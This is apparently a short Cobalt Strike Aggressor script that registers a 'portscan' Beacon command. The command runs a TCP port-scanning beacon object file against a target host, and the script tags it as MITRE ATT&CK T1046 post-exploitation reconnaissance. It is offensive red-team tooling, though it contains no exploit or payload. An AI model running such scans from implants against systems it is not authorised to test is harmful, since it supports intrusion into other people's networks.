# --- portscan ---
alias portscan {
    local('$bid $host $portrange $args');
    $bid       = $1;
    $host      = $2;
    $portrange = $3;
    if ($host is $null || $portrange is $null) {
        berror($bid, "Use: portscan <host> <port-range>\nExample: portscan 10.10.10.5 22,80,443,3389\nExample: portscan 10.10.10.5 1-1024");
        return;
    }
    $args = bof_pack($bid, "zz", $host, $portrange);
    dani_run($bid, "portscan", $args);
}
beacon_command_register(
    "portscan",
    "TCP port scanner — T1046 (by Dani)",
    "Synopsis: portscan <host> <port-range>\n\n" .
    "Description: Scan TCP ports on a target host. Port range can be\n" .
    "comma-separated values or a dash-delimited range.\n\n" .
    "Examples:\n" .
    "  portscan 10.10.10.5 22,80,443,3389,8080\n" .
    "  portscan 192.168.1.1 1-1024\n\n" .
    "MITRE ATT&CK: T1046 (Network Service Discovery)\n\n" .
    "Phase: 3 — Remote Ops\nArgs: <host> <port-range> (required)"
);

